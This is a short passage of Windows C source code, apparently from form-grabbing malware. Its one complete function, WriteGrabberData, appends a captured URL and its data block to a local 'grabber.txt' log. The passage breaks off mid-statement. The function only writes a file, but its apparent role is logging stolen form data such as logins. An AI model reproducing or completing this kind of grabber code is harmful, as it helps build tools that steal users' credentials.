...
void WriteGrabberData(const LPSTR url, LPBYTE data, int c_data)
{
	HANDLE fout = CreateFile( L"c:\\grabber.txt", GENERIC_WRITE, 0, 0, OPEN_ALWAYS, 0, 0 );
    if( fout == INVALID_HANDLE_VALUE ) return;
	SetFilePointer( fout, 0, 0, FILE_END );
	DWORD rd;
	WriteFile( fout, url, lstrlenA(url), &rd, 0 );
	WriteFile( fout, "\r\n{\r\n", 5, &rd, 0 );
	if( c_data < 0 ) c_data = lstrlenA((char*)data);
	WriteFile( fout, data, c_data, &rd, 0 );
	WriteFile( fout, "\r\n}\r\n\r\n", 7, &rd, 0 );
	CloseHandle(fout);
}
...
{
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if defined WDEBUG6
  WDEBUG6(WDDT_INFO,
